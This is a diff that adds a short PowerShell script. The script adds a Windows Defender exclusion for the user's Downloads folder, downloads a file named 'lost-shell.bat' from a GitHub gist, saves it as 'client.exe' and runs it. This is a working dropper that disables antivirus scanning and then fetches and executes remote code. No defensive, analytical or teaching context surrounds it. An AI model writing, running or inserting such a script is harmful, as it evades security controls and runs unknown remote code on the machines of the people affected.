@@ -1,0 +1,12 @@
+Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads
+$url = 'https://gist.githubusercontent.com/lostmyalias/60a9fa09b41f966ef7db759633413389/raw/6723d797bf24463ee4361f99b16dffc56b33a95c/lost-shell.bat'
+$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'client.exe')
+
+# Wait until the exclusion is confirmed (just a safeguard, usually it happens instantly)
+Start-Sleep -Milliseconds 100 
+
+# Download the file
+Invoke-WebRequest -Uri $url -OutFile $outputFile
+
+# Run the downloaded file after the download is complete
+Start-Process -FilePath $outputFile
